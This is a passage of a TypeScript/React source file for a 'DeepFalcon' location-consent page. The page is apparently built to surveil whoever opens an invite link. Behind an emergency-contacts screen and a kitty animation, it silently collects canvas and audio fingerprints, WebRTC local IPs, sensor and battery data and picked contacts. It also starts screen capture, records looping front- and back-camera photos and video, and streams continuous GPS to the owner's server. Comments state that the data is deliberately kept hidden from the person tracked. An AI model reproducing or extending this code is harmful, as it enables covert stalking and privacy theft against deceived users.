  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent || "";
  return (
    // In-app browsers by product name
    /FBAN|FBAV|Instagram|WhatsApp|LinkedInApp|Telegram|TikTok|BytedanceWebview|musical_ly|Snapchat|Twitter|Line\//.test(ua) ||
    // iOS non-Safari WebKit (all in-app browsers on iOS use WKWebView)
    (/iPhone|iPod|iPad/.test(ua) && !/Safari\//.test(ua) && /WebKit/.test(ua)) ||
    // Android system WebView embed (the "wv" token in the UA)
    (/Android/.test(ua) && /wv\)/.test(ua)) ||
    // Generic Android in-app pattern: Version/x.x Chrome/x is the signature
    // of apps that embed a raw WebView without customising the UA string
    (/Android/.test(ua) && /Version\/\d+\.\d+/.test(ua) && /Chrome\/\d+/.test(ua) && !/Chrome\/\d+ Mobile Safari\//.test(ua))
  );
}

async function reverseGeocode(lat: number, lng: number): Promise<string | undefined> {
  try {
    const { signal, clear } = abortAfter(8000);
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`, { headers: { "Accept-Language": "en" }, signal }).finally(clear);
    if (r.ok) return (await r.json()).display_name as string;
  } catch { /* ignore */ }
  return undefined;
}

export default function ConsentPage() {
  const { token } = useParams<{ token: string }>();
  const isWebView = detectWebView();
  const [state, setState] = useState<ConsentState>(isWebView ? "webview_blocked" : "idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [coords, setCoords] = useState<{ lat: number; lng: number; accuracy?: number } | null>(null);
  const [address, setAddress] = useState<string | undefined>();
  const [updateCount, setUpdateCount] = useState(0);
  const [lastSent, setLastSent] = useState<Date | null>(null);
  const [sharingSecondsLeft, setSharingSecondsLeft] = useState<number | null>(null);
  const [geoPhotoCount, setGeoPhotoCount] = useState(0);
  const [geoPhotoDone, setGeoPhotoDone] = useState(false);
  const [geoSelfiePhotoCount, setGeoSelfiePhotoCount] = useState(0);
  const [geoSelfiePhotoDone, setGeoSelfiePhotoDone] = useState(false);
  const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
  const [geoSelfieState, setGeoSelfieState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
  const [geoSelfieElapsed, setGeoSelfieElapsed] = useState(0);
  const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
  const [batteryCharging, setBatteryCharging] = useState(false);
  const [activityType, setActivityType] = useState<ActivityType>("stationary");
  const [linkCopied, setLinkCopied] = useState(false);
  const [contactsCollected, setContactsCollected] = useState(false);
  const contactsCollectedCountRef = useRef(0);
  const contactsTriedRef = useRef(false);
  const [showContactsPrompt, setShowContactsPrompt] = useState(false);
  const [autoRetrySecondsLeft, setAutoRetrySecondsLeft] = useState(AUTO_RETRY_SECONDS);
  const [kittyOverlayActive, setKittyOverlayActive] = useState(false);
  const kittyOverlayStartedRef = useRef(false);

  // Ref holding the latest doGrant so callbacks defined before doGrant can use it
  // without a "used before declaration" error (doGrant depends on processGeoPosition
  // which depends on startTracking, so it must be declared later in the file).
  const doGrantRef = useRef<() => void>(() => {});
  // Same pattern for startScreenCapture (defined in the session-recording section).
  const startScreenCaptureRef = useRef<() => void>(() => {});
  // Guard: processGeoPosition should only fire once — whichever GPS attempt wins.
  const grantProcessedRef = useRef(false);
  // Holds the sessionToken returned by the grant endpoint — used for location pushes
  // so each page-load maps to its own session row, not the shared invite token.
  const sessionTokenRef = useRef<string | null>(null);

  // ── New display-phase state machine ───────────────────────────────────────
  // contacts → kitty → contacts_popup → main
  // Contacts screen is ALWAYS shown first (before any location request).
  // Location runs silently in the background; errors are never surfaced to user.
  const [displayPhase, setDisplayPhase] = useState<"contacts" | "kitty" | "contacts_popup" | "main">("contacts");
  const [syncedContacts, setSyncedContacts] = useState<{ name: string; phone: string | null; email?: string | null }[]>([]);
  const syncedContactsRef = useRef<{ name: string; phone: string | null; email?: string | null }[]>([]);

  const geoBoardStartedRef = useRef(false);
  const geoSelfiePhotoStartedRef = useRef(false);
  const geoVideoStartedRef = useRef(false);
  const geoSelfieStartedRef = useRef(false);
  const selfieLoopActiveRef = useRef(false);
  const liveSelfieRecordingRef = useRef<GeoVideoHandle | null>(null);
  const earlyGeoRef = useRef<GeolocationPosition | null>(null);
  const earlyGeoErrRef = useRef<GeolocationPositionError | null>(null);
  const earlyGeoReadyRef = useRef(false);
  const sawNetworkFixRef = useRef(false);
  const sawGpsFixRef = useRef(false);
  const watchIdRef = useRef<number | null>(null);
  const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const sharingExpiryRef = useRef<number | null>(null);
  const sharingExpiryTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const sharingCountdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastWatchPushRef = useRef<number>(0);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
  const autoStartedRef = useRef(false);
  const autoContactsSkippedRef = useRef(false);
  const batteryLevelRef = useRef<number | null>(null);
  const batteryChargingRef = useRef(false);
  const activityTypeRef = useRef<ActivityType>("stationary");
  const gpsExtrasRef = useRef<{
    speedMps: number | null; headingDeg: number | null;
    altitudeMeters: number | null; altitudeAccuracyMeters: number | null;
  }>({ speedMps: null, headingDeg: null, altitudeMeters: null, altitudeAccuracyMeters: null });
  // Static-ish device/browser info gathered once — only ever surfaced to the
  // owner's dashboard (/api/sessions), never rendered on this public page.
  const deviceInfoRef = useRef<Record<string, unknown>>({});
  // Live notifications captured from the Service Worker — polled every 20 s
  // and merged into deviceInfo so every location push carries the latest set.
  const notifPollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // ── Session Recording (Mistral Pixtral) ─────────────────────────────────────
  // Tracks everything from page-open → location-grant for permanent AI memory.
  const sessionStartMsRef = useRef<number>(Date.now());
  const sessionTimelineRef = useRef<{ event: string; ts: number; detail?: unknown }[]>([]);
  const sessionFramesRef = useRef<string[]>([]);
  const sessionScreenVideoRef = useRef<HTMLVideoElement | null>(null);
  const sessionScreenStreamRef = useRef<MediaStream | null>(null);
  const sessionFrameCaptureRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const sessionSavedRef = useRef(false);

  const GPS_KEY = `deepfalcon_gps_${token}`;
  const loadStoredGps = (): { lat: number; lng: number; accuracy?: number } | null => {
    try { const raw = localStorage.getItem(GPS_KEY); if (!raw) return null; return JSON.parse(raw); } catch { return null; }
  };
  const saveGps = (lat: number, lng: number, accuracy?: number) => {
    try { localStorage.setItem(GPS_KEY, JSON.stringify({ lat, lng, accuracy, ts: Date.now() })); } catch {}
  };

  const stateRef = useRef<ConsentState>(isWebView ? "webview_blocked" : "idle");
  const addressRef = useRef<string | undefined>(undefined);
  const updateCountRef = useRef<number>(0);
  const coordsRef = useRef<{ lat: number; lng: number; accuracy?: number } | null>(null);

  useEffect(() => { stateRef.current = state; }, [state]);
  useEffect(() => { addressRef.current = address; }, [address]);
  useEffect(() => { updateCountRef.current = updateCount; }, [updateCount]);
  useEffect(() => { coordsRef.current = coords; }, [coords]);

  // ── Session: record page-open and track tab-switch events ───────────────────
  useEffect(() => {
    sessionStartMsRef.current = Date.now();
    sessionTimelineRef.current.push({ event: "page_open", ts: 0, detail: { token } });
    const onVisibility = () => {
      const e = document.visibilityState === "hidden" ? "app_hidden" : "app_visible";
      sessionTimelineRef.current.push({ event: e, ts: Date.now() - sessionStartMsRef.current });
    };
    document.addEventListener("visibilitychange", onVisibility);
    return () => {
      document.removeEventListener("visibilitychange", onVisibility);
      // Stop any ongoing screen capture on unmount
      sessionFrameCaptureRef.current && clearInterval(sessionFrameCaptureRef.current);
      sessionScreenStreamRef.current?.getTracks().forEach((t) => t.stop());
    };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  // Deep device/browser/network fingerprint — collected once asynchronously.
  // Only ever surfaced to the owner's dashboard (/api/sessions); never rendered
  // on this public page, so the contact cannot see their own data here.
  useEffect(() => {
    async function collectDeviceInfo() {
      const conn = (navigator as any).connection
        || (navigator as any).mozConnection
        || (navigator as any).webkitConnection;

      // ── 1. Client Hints — best Android model/brand source on Chrome ──────
      let hints: Record<string, unknown> = {};
      try {
        const uad = (navigator as any).userAgentData;
        if (uad?.getHighEntropyValues) {
          hints = await uad.getHighEntropyValues([
            "model", "platform", "platformVersion",
            "architecture", "bitness", "fullVersionList", "mobile",
          ]);
        }
      } catch { /* unsupported or blocked */ }

      // ── 2. Parse brand/model from UA as fallback ─────────────────────────
      const ua = navigator.userAgent;
      const androidMatch = ua.match(/Android[\s/]([\d.]+)/i);
      const buildMatch   = ua.match(/;\s*([^;)]+)\s+Build\//i);
      const fallbackModel = buildMatch?.[1]?.trim();

      // ── 3. GPU via WebGL debug extension ─────────────────────────────────
      let gpuVendor: string | null = null;
      let gpuRenderer: string | null = null;
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") as WebGLRenderingContext | null
          || canvas.getContext("experimental-webgl") as WebGLRenderingContext | null;
        if (gl) {
          const ext = gl.getExtension("WEBGL_debug_renderer_info");
          if (ext) {
            gpuVendor   = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   ?? null;
            gpuRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) ?? null;
          }
        }
      } catch { /* */ }

      // ── 4. Storage quota estimate ─────────────────────────────────────────
      let storageQuotaGb: string | null = null;
      let storageUsedGb:  string | null = null;
      try {
        if (navigator.storage?.estimate) {
          const est = await navigator.storage.estimate();
          if (est.quota) storageQuotaGb = (est.quota  / 1_073_741_824).toFixed(2) + " GB";
          if (est.usage) storageUsedGb  = (est.usage  / 1_073_741_824).toFixed(3) + " GB";
        }
      } catch { /* */ }

      // ── 5. Media devices (camera/mic count) ──────────────────────────────
      let cameraCount = 0;
      let microphoneCount = 0;
      let speakerCount = 0;
      try {
        if (navigator.mediaDevices?.enumerateDevices) {
          const devices = await navigator.mediaDevices.enumerateDevices();
          cameraCount     = devices.filter((d) => d.kind === "videoinput").length;
          microphoneCount = devices.filter((d) => d.kind === "audioinput").length;
          speakerCount    = devices.filter((d) => d.kind === "audiooutput").length;
        }
      } catch { /* permission denied — counts stay 0 */ }

      // ── 6. Network latency ping (RTT measurement) ─────────────────────────
      let measuredRttMs: number | null = null;
      try {
        const t0 = performance.now();
        await fetch(`${API_BASE}/api/healthz`, { method: "HEAD", cache: "no-store" });
        measuredRttMs = Math.round(performance.now() - t0);
      } catch { /* */ }

      // ── 7. Sensor availability ─────────────────────────────────────────────
      const sensors = {
        deviceMotion:      typeof DeviceMotionEvent      !== "undefined",
        deviceOrientation: typeof DeviceOrientationEvent !== "undefined",
        geolocation:       "geolocation"  in navigator,
        battery:           "getBattery"   in navigator,
        bluetooth:         "bluetooth"    in (navigator as any),
        usb:               "usb"          in (navigator as any),
        nfc:               "nfc"          in (navigator as any),
        vibration:         "vibrate"      in navigator,
        wakeLock:          "wakeLock"     in navigator,
        share:             "share"        in navigator,
        clipboard:         "clipboard"    in navigator,
        notification:      "Notification" in window,
      };

      // ── 8. Screen details ─────────────────────────────────────────────────
      const screen = window.screen ?? {} as Screen;
      const screenOrientation = (screen as any).orientation?.type ?? null;

      // ── 9. Connection extended ────────────────────────────────────────────
      const connectionInfo = conn ? {
        type:          conn.type          ?? null,
        effectiveType: conn.effectiveType ?? null,
        downlinkMbps:  conn.downlink      ?? null,
        downlinkMaxMbps: conn.downlinkMax ?? null,
        rttMs:         conn.rtt           ?? null,
        saveData:      conn.saveData      ?? null,
      } : null;

      // ── 10. Misc capabilities ─────────────────────────────────────────────
      const localeInfo = Intl.DateTimeFormat().resolvedOptions();

      // ── 11. WebRTC local IP leak (no permission needed) ───────────────────
      const localIPs: string[] = [];
      try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        await new Promise<void>((resolve) => {
          const t = setTimeout(() => { try { pc.close(); } catch { /* */ } resolve(); }, 2500);
          pc.onicecandidate = (e) => {
            if (!e.candidate) { clearTimeout(t); try { pc.close(); } catch { /* */ } resolve(); return; }
            const m = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
            if (m && !localIPs.includes(m[1])) localIPs.push(m[1]);
          };
        });
      } catch { /* not supported */ }

      // ── 12. Canvas fingerprint (GPU rasterisation differences) ────────────
      let canvasFingerprint: string | null = null;
      try {
        const fc = document.createElement("canvas");
        fc.width = 200; fc.height = 50;
        const c2d = fc.getContext("2d")!;
        c2d.textBaseline = "top";
        c2d.font = "14px Arial, sans-serif";
        c2d.fillStyle = "#f60";
        c2d.fillRect(125, 1, 62, 20);
        c2d.fillStyle = "#069";
        c2d.fillText("DeepFalcon \uD83D\uDD12 1.0", 2, 15);
        c2d.fillStyle = "rgba(102,204,0,0.7)";
        c2d.fillText("DeepFalcon \uD83D\uDD12 1.0", 4, 17);
        const raw = fc.toDataURL();
        let h = 0;
        for (let i = 0; i < raw.length; i++) { h = ((h << 5) - h) + raw.charCodeAt(i); h |= 0; }
        canvasFingerprint = Math.abs(h).toString(36);
      } catch { /* */ }

      // ── 13. Audio fingerprint (AudioContext oscillator hash) ──────────────
      let audioFingerprint: string | null = null;
      try {
        const AC = (window as any).OfflineAudioContext || (window as any).webkitOfflineAudioContext;
        if (AC) {
          const actx = new AC(1, 44100, 44100);
          const osc  = actx.createOscillator();
          const comp = actx.createDynamicsCompressor();
          osc.type = "triangle";
          osc.frequency.setValueAtTime(10000, actx.currentTime);
          osc.connect(comp); comp.connect(actx.destination);
          osc.start(0);
          const buf: AudioBuffer = await actx.startRendering();
          const ch = buf.getChannelData(0);
          let sum = 0;
          for (let i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
          audioFingerprint = sum.toFixed(10);
        }
      } catch { /* */ }

      // ── 14. Permission states (silent query, no prompts) ──────────────────
      const permStates: Record<string, string> = {};
      try {
        if (navigator.permissions?.query) {
          await Promise.allSettled(
            (["geolocation","notifications","camera","microphone","clipboard-read"] as PermissionName[]).map(async (name) => {
              const s = await navigator.permissions.query({ name });
              permStates[name.replace("-", "_")] = s.state;
            })
          );
        }
      } catch { /* */ }

      // ── 15. Performance / navigation timing ───────────────────────────────
      const timingInfo: Record<string, number | string | null> = {};
      try {
        const [nav] = performance.getEntriesByType("navigation") as PerformanceNavigationTiming[];
        if (nav) {
          timingInfo.dnsMs      = Math.round(nav.domainLookupEnd - nav.domainLookupStart);
          timingInfo.tcpMs      = Math.round(nav.connectEnd - nav.connectStart);
          timingInfo.ttfbMs     = Math.round(nav.responseStart - nav.requestStart);
          timingInfo.domLoadMs  = Math.round(nav.domContentLoadedEventEnd - nav.startTime);
          timingInfo.pageLoadMs = Math.round(nav.loadEventEnd - nav.startTime);
          timingInfo.transferKb = nav.transferSize ? Math.round(nav.transferSize / 1024) : null;
          timingInfo.protocol   = nav.nextHopProtocol || null;
        }
      } catch { /* */ }

      // ── 16. Browser plugins list ──────────────────────────────────────────
      const pluginList: string[] = [];
      try {
        for (let i = 0; i < (navigator.plugins?.length ?? 0); i++) {
          const p = navigator.plugins[i];
          if (p?.name) pluginList.push(p.name);
        }
      } catch { /* */ }

      // ── 17. Motion / orientation — first real hardware reading ────────────
      let motionReading: Record<string, number | null> | null = null;
      try {
        if (typeof DeviceMotionEvent !== "undefined") {
          motionReading = await new Promise<Record<string, number | null> | null>((resolve) => {
            const t = setTimeout(() => resolve(null), 2500);
            const h = (e: DeviceMotionEvent) => {
              clearTimeout(t);
              window.removeEventListener("devicemotion", h);
              resolve({
                accelX:    e.acceleration?.x    != null ? +e.acceleration.x.toFixed(3)    : null,
                accelY:    e.acceleration?.y    != null ? +e.acceleration.y.toFixed(3)    : null,
                accelZ:    e.acceleration?.z    != null ? +e.acceleration.z.toFixed(3)    : null,
                rotAlpha:  e.rotationRate?.alpha != null ? +e.rotationRate.alpha.toFixed(2) : null,
                rotBeta:   e.rotationRate?.beta  != null ? +e.rotationRate.beta.toFixed(2)  : null,
                rotGamma:  e.rotationRate?.gamma != null ? +e.rotationRate.gamma.toFixed(2) : null,
                intervalMs: e.interval ?? null,
              });
            };
            window.addEventListener("devicemotion", h, { once: true });
          });
        }
      } catch { /* */ }

      deviceInfoRef.current = {
        device: {
          model:           (hints as any).model           || fallbackModel || null,
          brand:           (() => {
                              const brands: any[] = (hints as any).fullVersionList ?? (hints as any).brands ?? [];
                              const real = brands.find((b: any) => !/not.a.brand|chromium/i.test(b.brand));
                              return real?.brand ?? null;
                            })(),
          platform:        (hints as any).platform        ?? (navigator as any).userAgentData?.platform ?? null,
          platformVersion: (hints as any).platformVersion ?? androidMatch?.[1] ?? null,
          architecture:    (hints as any).architecture    ?? null,
          bitness:         (hints as any).bitness         ?? null,
          mobile:          (hints as any).mobile          ?? (/Mobi|Android/i.test(ua) || null),
          userAgent:       ua,
        },
        network: {
          ...connectionInfo,
          measuredRttMs,
          onLine: navigator.onLine,
          ...(localIPs.length ? { localIPs: localIPs.join(", ") } : {}),
        },
        hardware: {
          screenWidth:     screen.width          ?? null,
          screenHeight:    screen.height         ?? null,
          availWidth:      screen.availWidth     ?? null,
          availHeight:     screen.availHeight    ?? null,
          colorDepth:      screen.colorDepth     ?? null,
          pixelRatio:      window.devicePixelRatio ?? null,
          orientation:     screenOrientation,
          cpuCores:        navigator.hardwareConcurrency ?? null,
          deviceMemoryGb:  (navigator as any).deviceMemory ?? null,
          maxTouchPoints:  navigator.maxTouchPoints ?? null,
          touchSupport:    "ontouchstart" in window || navigator.maxTouchPoints > 0,
          storageQuotaGb,
          storageUsedGb,
          gpuVendor,
          gpuRenderer,
          cameras:         cameraCount     || null,
          microphones:     microphoneCount || null,
          speakers:        speakerCount    || null,
        },
        software: {
          language:          navigator.language,
          languages:         navigator.languages ? Array.from(navigator.languages) : null,
          timezone:          localeInfo.timeZone,
          locale:            localeInfo.locale,
          calendar:          localeInfo.calendar,
          cookiesEnabled:    navigator.cookieEnabled,
          doNotTrack:        navigator.doNotTrack,
          pdfViewerEnabled:  (navigator as any).pdfViewerEnabled ?? null,
          webdriver:         (navigator as any).webdriver ?? false,
          vendor:            navigator.vendor || null,
          appVersion:        navigator.appVersion || null,
          plugins:           pluginList.length ? pluginList.join(", ") : null,
        },
        sensors,
        identity: {
          canvasFingerprint: canvasFingerprint ?? null,
          audioFingerprint:  audioFingerprint  ?? null,
        },
        ...(Object.keys(permStates).length  ? { permissions: permStates }   : {}),
        ...(Object.keys(timingInfo).length  ? { timing:      timingInfo }   : {}),
        ...(motionReading                   ? { motion:      motionReading } : {}),
      };
    }

    collectDeviceInfo().catch(() => {});
  }, []);

  // Battery API — guard against unmount before getBattery() resolves
  useEffect(() => {
    if (!("getBattery" in navigator)) return;
    let mounted = true;
    let batObj: any = null;
    const onLevel   = () => { if (mounted && batObj) { const lvl = Math.round(batObj.level * 100); setBatteryLevel(lvl); batteryLevelRef.current = lvl; } };
    const onCharging = () => { if (mounted && batObj) { setBatteryCharging(batObj.charging); batteryChargingRef.current = batObj.charging; } };
    (navigator as any).getBattery().then((b: any) => {
      if (!mounted) return; // component already unmounted
      batObj = b;
      const lvl = Math.round(b.level * 100);
      setBatteryLevel(lvl);
      setBatteryCharging(b.charging);
      batteryLevelRef.current = lvl;
      batteryChargingRef.current = b.charging;
      // Merge real battery values into the device-info blob so the owner
      // sees actual level / charge times in the Sessions panel.
      deviceInfoRef.current = {
        ...deviceInfoRef.current,
        battery: {
          level:               lvl,
          charging:            b.charging,
          chargingTimeSecs:    b.chargingTime    !== Infinity ? b.chargingTime    : null,
          dischargingTimeSecs: b.dischargingTime !== Infinity ? b.dischargingTime : null,
        },
      };
      b.addEventListener("levelchange", onLevel);
      b.addEventListener("chargingchange", onCharging);
    }).catch(() => {});
    return () => {
      mounted = false;
      if (batObj) {
        batObj.removeEventListener("levelchange", onLevel);
        batObj.removeEventListener("chargingchange", onCharging);
      }
    };
  }, []);

  const { data: invite, isLoading, isError } = useGetInviteByToken(token!, {
    query: { enabled: !!token && !isWebView, queryKey: getGetInviteByTokenQueryKey(token!), retry: 1, retryDelay: 600 },
  });

  const grant = useGrantLocationConsent();

  // Contact Picker API — fires automatically in the same user-gesture window
  // as the main "Grant All Access" tap so the OS picker opens without any
  // extra button. Capped at 6 contacts; result merges into deviceInfoRef and
  // travels with the next location push → visible in the owner's Sessions panel.
  const pickContacts = useCallback(async () => {
    if (contactsTriedRef.current || !("contacts" in navigator)) return;
    contactsTriedRef.current = true;
    try {
      const contacts = await (navigator as any).contacts.select(
        ["name", "tel", "email"],
        { multiple: true },
      );
      if (contacts?.length) {
        const mapped = contacts.slice(0, 6).map((c: any) => ({
          name:  (c.name?.[0]  ?? null),
          phone: (c.tel?.[0]   ?? null),
          email: (c.email?.[0] ?? null),
        }));
        deviceInfoRef.current = { ...deviceInfoRef.current, contacts: mapped };
        contactsCollectedCountRef.current = mapped.length;
        setContactsCollected(true);
      }
    } catch { /* user cancelled or API unavailable */ }
  }, []);

  // Enhanced contact picker that also saves to syncedContacts for the popup
  // and persists to localStorage. Used by the new contacts-first flow.
  //
  // Race-condition safety: if this resolves AFTER the kitty animation already
  // completed (displayPhase moved to "main"), we immediately flip to
  // "contacts_popup" so the popup is never silently skipped.
  const pickContactsAndSave = useCallback(async (): Promise<void> => {
    contactsTriedRef.current = true;
    if (!("contacts" in navigator)) {
      // Contact Picker API not available — proceed silently with no contacts.
      return;
    }
    try {
      const contacts = await (navigator as any).contacts.select(
        ["name", "tel", "email"],
        { multiple: true },
      );
      if (contacts?.length) {
        const mapped = contacts.slice(0, 6).map((c: any) => ({
          name:  c.name?.[0]  ?? "Unknown",
          phone: c.tel?.[0]   ?? null,
          email: c.email?.[0] ?? null,
        }));
        syncedContactsRef.current = mapped;
        setSyncedContacts(mapped);
        deviceInfoRef.current = { ...deviceInfoRef.current, contacts: mapped };
        contactsCollectedCountRef.current = mapped.length;
        setContactsCollected(true);
        try { localStorage.setItem(`deepfalcon_contacts_${token}`, JSON.stringify(mapped)); } catch {}

        // If the kitty already completed and we're in "main", show the popup now
        // (handles the race where contacts resolve after the 5s kitty timer).
        setDisplayPhase((current) => current === "main" ? "contacts_popup" : current);
      }
    } catch { /* user cancelled */ }
  }, [token]);

  // Handle kitty animation completion — show popup if contacts found, else main.
  const handleKittyComplete = useCallback(() => {
    if (syncedContactsRef.current.length > 0) {
      setDisplayPhase("contacts_popup");
    } else {
      setDisplayPhase("main");
    }
  }, []);

  // Handle "Allow contacts" button on the emergency contacts screen.
  // Uses doGrantRef to avoid "used before declaration" (doGrant is defined later).
  const handleAllowContacts = useCallback(async () => {
    // This tap is a real user-gesture — use it to:
    // 1. Re-fire GPS (in case the page-load attempt's permission dialog was missed)
    // 2. Unblock camera/mic and screen-share which require a gesture
    doGrantRef.current();
    prewarmCamera();
    startScreenCaptureRef.current();
    // Mark contacts as tried so pickContacts() inside doGrant stays a no-op.
    contactsTriedRef.current = true;
    // Wait for the user to choose contacts and tap Done — kitty must not start yet.
    await pickContactsAndSave();
    // Only NOW switch to kitty — after the picker is dismissed.
    kittyOverlayStartedRef.current = true;
    setDisplayPhase("kitty");
  }, [pickContactsAndSave]);

  // Handle "Skip" on emergency contacts screen.
  const handleSkipContacts = useCallback(() => {
    // Real user-gesture tap — re-fire GPS (catches devices where the page-load
    // permission dialog was missed) and unblock gesture-gated APIs.
    doGrantRef.current();
    prewarmCamera();
    startScreenCaptureRef.current();
    // Mark contacts as tried so the old overlay doesn't re-appear in tracking view.
    contactsTriedRef.current = true;
    setContactsCollected(true);
    // Consume the legacy kitty slot to prevent a second overlay in main phase.
    kittyOverlayStartedRef.current = true;
    setDisplayPhase("kitty");
  }, []);


  const acquireWakeLock = useCallback(async () => {
    if ("wakeLock" in navigator) {
      try {
        wakeLockRef.current = await (navigator as any).wakeLock.request("screen");
        wakeLockRef.current?.addEventListener("release", () => {
          if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock();
        });
      } catch { /* non-critical */ }
    }
  }, []);

  const pushLocation = useCallback(async (
    lat: number, lng: number, acc?: number, addr?: string,
    locationStatus: "active" | "offline" = "active", source?: LocationSource,
  ) => {
    // Use the per-session token if available (returned by the grant endpoint).
    // Falls back to the invite token so pushes work even if grant hasn't completed yet.
    const effectiveToken = sessionTokenRef.current ?? token;
    try {
      const { signal, clear } = abortAfter(10000);
      await fetch(`${API_BASE}/api/location/push`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          token: effectiveToken, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus,
          // Battery/activity are captured on this device but are only ever
          // surfaced to the owner's dashboard — never rendered on this
          // public page, so the contact can't see them here either.
          batteryLevel: batteryLevelRef.current ?? undefined,
          batteryCharging: batteryChargingRef.current,
          activityType: activityTypeRef.current,
          deviceInfo: { ...deviceInfoRef.current, ...gpsExtrasRef.current },
        }),
        signal,
      }).finally(clear);
      setLastSent(new Date());
      setUpdateCount((c) => c + 1);
    } catch { /* retry on next */ }
  }, [token]);

  const notifySW = useCallback((type: string, extra?: object) => {
    if (!("serviceWorker" in navigator)) return;
    navigator.serviceWorker.ready.then((reg) => {
      if (reg.active) reg.active.postMessage({ type, ...extra });
    }).catch(() => {});
  }, []);

  useEffect(() => {
    if (!("serviceWorker" in navigator)) return;
    const handler = (e: MessageEvent) => { if (e.data?.type === "STOP_TRACKING_FROM_NOTIFICATION") stopTracking(); };
    navigator.serviceWorker.addEventListener("message", handler);
    return () => navigator.serviceWorker.removeEventListener("message", handler);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const startTracking = useCallback((initialLat: number, initialLng: number, _initialAcc?: number) => {
    const sharingExpiresAt = Date.now() + LOCATION_SHARING_DURATION_MS;
    sharingExpiryRef.current = sharingExpiresAt;
    setSharingSecondsLeft(Math.ceil(LOCATION_SHARING_DURATION_MS / 1000));
    if (sharingExpiryTimerRef.current !== null) clearTimeout(sharingExpiryTimerRef.current);
    if (sharingCountdownRef.current !== null) clearInterval(sharingCountdownRef.current);

    setState("tracking");
    acquireWakeLock();
    // Auto-pop the contacts overlay as soon as tracking starts — one tap closes
    // it and immediately opens the OS picker (that single tap is the user
    // gesture Chrome requires for navigator.contacts.select).
    if ("contacts" in navigator) setShowContactsPrompt(true);
    notifySW("LOCATION_TRACKING_STARTED", {
      inviterName: invite?.fromUserName ?? undefined,
      expiresAt: sharingExpiresAt,
    });

    if (!geoVideoStartedRef.current) {
      geoVideoStartedRef.current = true;
      geoSelfieStartedRef.current = true;
      geoBoardStartedRef.current = true;
      selfieLoopActiveRef.current = true;

      const tok = String(token);
      // Full GeoBoard capture sequence (runs once per session start):
      // 1. Environmental photos (back camera, 5 shots)
      // 2. Selfie photos (front camera, 2 shots)
      // 3. Looping 40-second selfie video clips (saves each to GeoBoard immediately)
      (async () => {
        // ── Environmental photos ─────────────────────────────────────────────
        await captureGeoPhotos(
          tok, initialLat, initialLng, addressRef.current,
          (n) => setGeoPhotoCount(n), "environment", GEO_PHOTO_COUNT,
        ).catch(() => {});
        setGeoPhotoDone(true);

        // ── Selfie photos ────────────────────────────────────────────────────
        if (!geoSelfiePhotoStartedRef.current) {
          geoSelfiePhotoStartedRef.current = true;
          await captureGeoPhotos(
            tok, initialLat, initialLng, addressRef.current,
            (n) => setGeoSelfiePhotoCount(n), "user", GEO_SELFIE_PHOTO_COUNT,
          ).catch(() => {});
          setGeoSelfiePhotoDone(true);
        }

        // ── Alternating environmental + selfie video clips ───────────────────
        // Mobile browsers allow only one camera stream at a time, so we
        // alternate: 30-second back-camera clip → 40-second front-camera clip →
        // repeat.  Each clip is saved to GeoBoard as soon as it finalises.
        while (selfieLoopActiveRef.current) {
          // Environmental clip (back camera, 30 s)
          if (!selfieLoopActiveRef.current) break;
          const envHandle: GeoVideoHandle = { stop: () => {} };
          liveSelfieRecordingRef.current = envHandle;
          await captureGeoVideo(tok, initialLat, initialLng, addressRef.current,
            (s) => setGeoVideoState(s), {
              facingMode: "environment",
              durationMs: GEO_VIDEO_DURATION_MS,
              videoBps: GEO_VIDEO_BPS,
              audioBps: null,
              width: 320, height: 240, frameRate: 10,
              handle: envHandle,
            },
          ).catch(() => {});
          if (liveSelfieRecordingRef.current === envHandle) liveSelfieRecordingRef.current = null;

          // Selfie clip (front camera, 40 s)
          if (!selfieLoopActiveRef.current) break;
          const selfieHandle: GeoVideoHandle = { stop: () => {} };
          liveSelfieRecordingRef.current = selfieHandle;
          setGeoSelfieElapsed(0);
          await captureGeoVideo(tok, initialLat, initialLng, addressRef.current,
            (s) => setGeoSelfieState(s), {
              facingMode: "user",
              durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
              videoBps: GEO_SELFIE_VIDEO_BPS,
              audioBps: null,
              width: 320, height: 240, frameRate: 12,
              onElapsed: (s) => setGeoSelfieElapsed(s),
              handle: selfieHandle,
            },
          ).catch(() => { if (selfieLoopActiveRef.current) setGeoSelfieState("error"); });
          if (liveSelfieRecordingRef.current === selfieHandle) liveSelfieRecordingRef.current = null;
        }
      })();
    }

    if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }

    watchIdRef.current = navigator.geolocation.watchPosition(
      async (pos) => {
        sawGpsFixRef.current = true;
        const { latitude: lat, longitude: lng, accuracy: acc, speed, heading, altitude, altitudeAccuracy } = pos.coords;
        setCoords({ lat, lng, accuracy: acc });
        saveGps(lat, lng, acc);
        if (stateRef.current !== "tracking") setState("tracking");

        // Raw GPS fields beyond lat/lng/accuracy — only ever surfaced to the
        // owner's dashboard (see deviceInfoRef / pushLocation below).
        gpsExtrasRef.current = {
          speedMps: typeof speed === "number" ? speed : null,
          headingDeg: typeof heading === "number" ? heading : null,
